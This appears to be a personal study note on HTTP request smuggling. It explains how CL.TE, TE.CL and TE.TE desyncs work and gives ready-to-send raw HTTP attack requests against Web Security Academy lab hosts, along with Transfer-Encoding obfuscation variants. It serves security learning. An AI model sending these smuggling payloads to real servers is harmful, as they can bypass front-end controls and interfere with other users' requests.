# Request Smuggling 101

>[!question] What is HTTP request smuggling?
> Is a technique for **interfering with the way a web site processes sequences of HTTP requests** that are received from one or more users.

![](zzz_res/attachments/Pasted%20image%2020230402154059.png)

 Most HTTP request smuggling vulnerabilities arise because the HTTP specification provides two different ways to specify where a request ends: 
 - the `Content-Length` header: it specifies the length of the message body in bytes
 - the `Transfer-Encoding` header: can be used to specify that the message body uses chunked encoding. This means that the message body contains one or more chunks of data. Each chunk consists of the chunk size in bytes (expressed in hexadecimal), followed by a newline, followed by the chunk contents. The message is terminated with a chunk of size zero.
```http
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

b
q=smuggling
0
```

Since the HTTP specification provides two different methods for specifying the length of HTTP messages, it is possible for a single message to use both methods at once, such that they conflict with each other.

# Detecting HTTP request smuggling vulnerabilities

Request smuggling attacks involve placing both the `Content-Length` header and the `Transfer-Encoding` header into a single HTTP request and manipulating these so that the front-end and back-end servers process the request differently. The exact way in which this is done depends on the behavior of the two servers:

-   **CL.TE**: the front-end server uses the `Content-Length` header and the back-end server uses the `Transfer-Encoding` header.
-   **TE.CL**: the front-end server uses the `Transfer-Encoding` header and the back-end server uses the `Content-Length` header.
-   **TE.TE**: the front-end and back-end servers both support the `Transfer-Encoding` header, but one of the servers can be induced not to process it by obfuscating the header in some way.

## CL.TE vulnerabilities

The front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header:

Smuggling request:
```http
POST / HTTP/1.1
Host: 0acd00da03a2776381c07ff100b10027.web-security-academy.net
Content-Length: 7
Transfer-Encoding: chunked

0

G
```

Request sent after get smuggled (the `G` sent before is prepended to `POST`):
```http
GPOST /post/comment HTTP/1.1
Host: 0acd00da03a2776381c07ff100b10027.web-security-academy.net

csrf=rMS2qQHV8HyyZJbcBKObOO78FbBQwIyZ&postId=5&comment=asd&name=asd&email=asd%40asd.asd&website=


HTTP/1.1 403 Forbidden
"Unrecognized method GPOST"
```

### Find CL.TE using timings

>[!note] Note
>Since the front-end server uses the `Content-Length` header, it will forward only part of this request, omitting the `G`. The back-end server uses the `Transfer-Encoding` header, processes the first chunk, and then waits for the next chunk to arrive. This will cause an observable time delay.

```http
POST / HTTP/1.1
Host: 0acd00da03a2776381c07ff100b10027.web-security-academy.net
Content-Length: 4
Transfer-Encoding: chunked

1
A
G
```

### Confirming CL.TE vulnerabilities using differential responses

Attack request:
```http
POST / HTTP/1.1
Host: 0a0000f7040caa64807e80a800d50021.web-security-academy.net
Cookie: session=YMVczDiZYma5L95S4fFbNXnGVYonnrlD
Content-Length: 30
Transfer-Encoding: chunked
Connection: close

0

POST /404 HTTP/1.1
foo: 
```

If the attack is successful, then the last two lines of this request are treated by the back-end server as belonging to the next request that is received.
This will cause the subsequent "normal" request to look like this:
```http
POST /404 HTTP/1.1
foo:POST / HTTP/1.1
Host: 0a0000f7040caa64807e80a800d50021.web-security-academy.net
Cookie: session=YMVczDiZYma5L95S4fFbNXnGVYonnrlD
Content-Length: 3

a=b
```

## TE.CL vulnerabilities

The front-end server uses the `Transfer-Encoding` header and the back-end server uses the `Content-Length` header:

```http
POST / HTTP/1.1
Host: 0a51002b038f542d807e6c3b001900de.web-security-academy.net
Transfer-Encoding: chunked
Content-Type: application/x-www-form-urlencoded
Content-Length: 4

9d
GPOST / HTTP/1.1
Host: 0a51002b038f542d807e6c3b001900de.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

### Find TE.CL using timings

>[!note] Note
>Since the front-end server uses the `Transfer-Encoding` header, it will forward only part of this request, omitting the `X`. The back-end server uses the `Content-Length` header, expects more content in the message body, and waits for the remaining content to arrive. This will cause an observable time delay.

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 6

0

X
```

### Confirming TE.CL vulnerabilities using differential responses

Attack request:
```http
POST / HTTP/1.1
Host: 0ac700e7043c13ce850119ed00ea00d4.web-security-academy.net
Transfer-Encoding: chunked
Content-Length: 4

73
POST /404 HTTP/1.1
Host: 0ac700e7043c13ce850119ed00ea00d4.web-security-academy.net
Content-Length: 150

foo=bar
0
```

If the attack is successful, then everything from `POST /404` onwards is treated by the back-end server as belonging to the next request that is received. This will cause the subsequent "normal" request to look like this:
```http
POST /404 HTTP/1.1
Host: 0ac700e7043c13ce850119ed00ea00d4.web-security-academy.net
Content-Length: 150

foo=bar
0

POST / HTTP/1.1
Host: 0ac700e7043c13ce850119ed00ea00d4.web-security-academy.net
Transfer-Encoding: chunked
Content-Length: 4
```

## TE.TE vulnerabilities (obfuscating TE header)

The front-end and back-end servers both support the `Transfer-Encoding` header, but one of the servers can be induced not to process it by obfuscating the header in some way.

Some obfuscation examples:
```http
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

To uncover a TE.TE vulnerability, it is necessary to find some variation of the `Transfer-Encoding` header such that only one of the front-end or back-end servers processes it, while the other server ignores it.

```http
POST / HTTP/1.1
Host: 0a6a008e033bed808147e98200020068.web-security-academy.net
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Content-length: 4
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Transfer-Encoding: foo

a1
GPOST / HTTP/1.1
Host: 0a6a008e033bed808147e98200020068.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 15

foo=bar
0


```

# Exploiting HTTP Request Smuggling

- [Bypass front-end security controls](Exploiting%20HTTP%20Request%20Smuggling.md#Bypass%20front-end%20security%20controls)
- [Revealing front-end request rewriting](Exploiting%20HTTP%20Request%20Smuggling.md#Revealing%20front-end%20request%20rewriting)
- [Bypassing client authentication](Exploiting%20HTTP%20Request%20Smuggling.md#Bypassing%20client%20authentication)
- [Capturing other user' requests](Exploiting%20HTTP%20Request%20Smuggling.md#Capturing%20other%20user'%20requests)
- [Using request smuggling to exploit reflected XSS](Exploiting%20HTTP%20Request%20Smuggling.md#Using%20request%20smuggling%20to%20exploit%20reflected%20XSS)
- [Using request smuggling to turn an on-site redirect into an open redirect](Exploiting%20HTTP%20Request%20Smuggling.md#Using%20request%20smuggling%20to%20turn%20an%20on-site%20redirect%20into%20an%20open%20redirect)
- [Using request smuggling to perform web cache poisoning](Exploiting%20HTTP%20Request%20Smuggling.md#Using%20request%20smuggling%20to%20perform%20web%20cache%20poisoning)
- [Using request smuggling to perform web cache deception](Exploiting%20HTTP%20Request%20Smuggling.md#Using%20request%20smuggling%20to%20perform%20web%20cache%20deception)


# External researches

- [HTTP Desync Attacks: Request Smuggling Reborn, PortSwigger](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)